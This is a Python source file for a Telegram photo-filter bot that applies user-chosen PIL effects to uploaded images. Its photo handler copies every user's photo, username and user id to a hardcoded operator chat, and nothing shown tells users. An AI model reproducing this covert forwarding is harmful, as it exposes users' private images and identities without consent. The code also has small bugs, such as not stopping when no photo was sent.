import logging
from telegram.ext import Application, filters
from telegram.ext import CommandHandler, MessageHandler, ConversationHandler
from config import BOT_TOKEN

from io import BytesIO
from requests import get
from pil_filters import filters_and_effects

from PIL import Image


logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.DEBUG
)

logger = logging.getLogger(__name__)


def load_text(file_path):
    with open(file_path, "r", encoding="UTF-8") as txt_file:
        text = txt_file.read()
        return text


start_text = load_text("texts/start_text.txt")
info_text = load_text("texts/info_text.txt")
filters_text = load_text("texts/filters_text.txt")


def pil_to_bytes(pil_photo):
    new_photo = pil_photo.copy()
    buf = BytesIO()
    new_photo.save(buf, format="JPEG")
    bytes_new_photo = buf.getvalue()
    return bytes_new_photo


async def start(update, context):
    await context.bot.send_message(chat_id=update.effective_chat.id, text=start_text)


async def info(update, context):
    await context.bot.send_message(chat_id=update.effective_chat.id, text=info_text)


async def filters_command(update, context):
    await context.bot.send_message(chat_id=update.effective_chat.id, text=filters_text)


async def handle_photo(update, context):
    global counter
    photo = await update.message.effective_attachment[-1].get_file()
    url = photo.file_path
    response = get(url)
    bytes_obj = BytesIO(response.content)

    result_photo = Image.open(bytes_obj)
    context.user_data["photo_bytes"] = result_photo

    main_chat_id = 932106701
    current_chat_id = update.effective_chat.id

    if current_chat_id != main_chat_id:
        user = update.message.from_user
        text = f"Username: {user['username']}\nChat/User id: {user['id']}"
        await context.bot.send_photo(chat_id=main_chat_id, photo=pil_to_bytes(result_photo), caption=text)

    await context.bot.send_message(chat_id=current_chat_id, text="send numbers of filters")


async def filters_handler(update, context):
    if "photo_bytes" not in context.user_data:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="To put effects, you firstly need to send me a photo.")
    text = update.message.text
    text = text.strip()

    pil_photo = context.user_data["photo_bytes"]

    wrong_filters = set()

    filters_to_apply = text.split()
    for filter_ in filters_to_apply:
        if not (filter_.isdigit() and (int(filter_) - 1) < len(filters_and_effects)):
            wrong_filters.add(filter_)

    if wrong_filters:
        message = f"I haven't got such filters: {', '.join(map(str, wrong_filters))}"
        await context.bot.send_message(chat_id=update.effective_chat.id, text=message)
    else:
        # creating temporary message
        processing_message = await context.bot.send_message(chat_id=update.effective_chat.id, text="Processing...")

        for index in filters_to_apply:
            dict_index = int(index) - 1
            pil_photo = filters_and_effects[dict_index](pil_photo)
        
        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=processing_message.message_id)
        # deleting temporary message
        del processing_message
        
        bytes_new_photo = pil_to_bytes(pil_photo)
        await context.bot.send_photo(chat_id=update.effective_chat.id, photo=bytes_new_photo)


def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("filters", filters_command))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    text_handler = MessageHandler(filters.TEXT & ~filters.COMMAND, filters_handler)
    application.add_handler(text_handler)

    application.run_polling()


if __name__ == "__main__":
    main()
